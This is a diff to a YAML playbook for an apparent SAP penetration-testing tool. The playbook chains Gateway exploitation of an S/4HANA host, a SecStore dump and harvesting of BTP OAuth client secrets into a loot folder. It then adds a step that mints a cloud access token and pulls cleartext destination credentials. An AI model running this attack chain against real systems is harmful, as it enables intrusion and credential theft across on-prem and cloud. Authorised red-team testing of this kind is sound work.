@@ -1,4 +1,4 @@
-# SAPMAP playbook: on-prem → BTP lateral pivot
+# SAPMAP playbook: on-prem → BTP full lateral pivot
 #
 #   1. Discover S4H on the lab subnet
 #   2. Check Gateway (10KBlaze / SAPXPG) vulnerability
@@ -8,6 +8,11 @@
 #   5. Harvest BTP credentials — refreshes OA2C_CLIENT[_EXT] and
 #      scans every artefact source for BTP-shaped (client_id,
 #      client_secret) tuples
+#   6. Mint a BTP access token from a harvested OAuth client and
+#      auto-pull every destination on the bound subaccount —
+#      cleartext on-prem credentials sitting on the BTP side land
+#      on the map automatically (the BTP cloud node + synthetic
+#      BTP→on-prem edges appear in the next render tick)
 #
 # Usage:
 #   python3 sapmap.py --script scripts/demo_onprem_to_btp.yaml --confirm
@@ -16,28 +21,28 @@
 # destructive action that mints a real ABAP user on the target.
 # The other steps are read-only and run dry without --confirm.
 #
-# After the playbook finishes, look at the harvest log for
-# candidates and either:
-#   * click Mint in the GUI (right-click the node → Exploitation
-#     → Harvest BTP Credentials), or
-#   * append a `mint_btp_token` step here with the chosen
-#     candidate's uaa_url / client_id / client_secret to fully
-#     automate the pivot.
+# Step 6 needs three inputs from the harvest log (step 5):
+#   * uaa_url      — the OAuth profile's TOKEN_ENDPOINT, normalised
+#                    to https://...authentication.../oauth/token
+#   * client_id    — the OAuth profile's CLIENT_ID
+#   * client_secret — the matched secstore secret
+# Either fill them inline or use `path:<file>` so the YAML never
+# carries a real secret in version control.
 
 name: "On-prem S/4 → BTP Lateral Pivot Demo"
 description: >
-  Discover S4H on 192.168.2.0/24, root via the gateway, dump the
-  ABAP SecStore (RSECTAB), and harvest any BTP-bound OAuth client
-  credentials sitting in OA2C_CONFIG / SM59 / SecStoreFS.  The
-  output of the harvest step is the input to a separate
-  `mint_btp_token` action that exchanges the secret at XSUAA for a
-  BTP token and auto-enumerates the cloud topology.
+  Discover S4H, root via the gateway, dump the ABAP SecStore
+  (RSECTAB), harvest any BTP-bound OAuth client credentials sitting
+  in OA2C_CONFIG / SM59 / SecStoreFS, and mint a BTP access token
+  to enumerate destinations on the bound subaccount.  End to end:
+  one click → on-prem foothold → cloud topology + cleartext
+  destinations on the map.
 
 steps:
   # 1. Discover S/4 on the lab subnet (S4H = 192.168.2.209).  Adjust
   #    the CIDR to your engagement scope.
   - action: scan
-    targets: "192.168.2.0/24"
+    targets: "192.168.2.209"
     mode: fast
     timeout: 600
 
@@ -69,14 +74,21 @@ steps:
   - action: harvest_btp_creds
     target: S4H
 
-  # ---------------------------------------------------------------
-  # Optional follow-up — uncomment and fill in once you've reviewed
-  # the harvest output and chosen a candidate to mint.  Use
-  # `path:./loot/btp/secret.txt` to load the client_secret from a
-  # file so the YAML stays clean of secrets.
-  # ---------------------------------------------------------------
-  # - action: mint_btp_token
-  #   target: S4H
-  #   uaa_url: "https://<subdomain>.authentication.<region>.hana.ondemand.com/oauth/token"
-  #   client_id: "sb-clone…!b…|destination-xsappname!b…"
-  #   client_secret: "path:./loot/btp/sapmap_dest_secret.txt"
+  # 6. Mint a BTP access token using a harvested OAuth client.
+  #    Fill in `uaa_url`, `client_id` and `client_secret` from the
+  #    harvest output (step 5).  The endpoint auto-enumerates the
+  #    bound subaccount's destinations after a successful mint, so
+  #    cleartext on-prem credentials sitting on the BTP side land
+  #    on the map automatically — no separate pull step needed.
+  #
+  #    Use `path:<file>` to load the client_secret from disk so the
+  #    YAML never has to carry a real secret in version control.
+  #
+  #    Replace the placeholders below with your tenant's values
+  #    (e.g. uaa_url ends in
+  #    `<subdomain>.authentication.<region>.hana.ondemand.com/oauth/token`).
+  - action: mint_btp_token
+    target: S4H
+    uaa_url: "https://<subdomain>.authentication.<region>.hana.ondemand.com/oauth/token"
+    client_id: "sb-clone…!b…|destination-xsappname!b…"
+    client_secret: "path:./loot/btp/sapmap_dest_secret.txt"
